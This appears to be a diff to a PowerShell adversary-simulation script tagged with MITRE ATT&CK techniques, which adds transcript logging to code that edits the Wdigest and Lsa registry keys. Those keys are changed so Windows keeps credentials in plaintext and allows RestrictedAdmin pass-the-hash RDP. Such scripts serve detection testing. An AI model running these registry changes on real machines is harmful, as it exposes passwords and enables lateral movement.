@@ -1,8 +1,12 @@
-# T1112 - Modify Registry
-# T1003 - OS Credential Dumping
-# T1021 - Remote Services
-# Enable RestrictedAdmin to login with NTLM hash - RDP without password using login with NTLM hash and mstsv.exe /RestrictedAdmin (RestrictedAdmin introduced on W8.1 and W2012R2)
-# And Force Wdigest to store in plaintext
+<# 
+    T1112 - Modify Registry
+    T1003 - OS Credential Dumping
+    T1021 - Remote Services
+    Enable RestrictedAdmin to login with NTLM hash - RDP without password using login with NTLM hash and mstsv.exe /RestrictedAdmin (RestrictedAdmin introduced on W8.1 and W2012R2)
+    And Force Wdigest to store in plaintext
+#>
+
+Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append
 
 $registryPath = "HKLM:\System\CurrentControlSet\Control\SecurityProviders\Wdigest"
 $registryPath2 = "HKLM:\System\CurrentControlSet\Control\Lsa"
@@ -24,3 +28,5 @@ If($checkReg2 -ne 1 -or $checkReg2 -eq $null){
 } Elseif($checkReg2 -eq 1) {
     Write-Host "Wdigest already store in plaintext"
 }
+
+Stop-Transcript
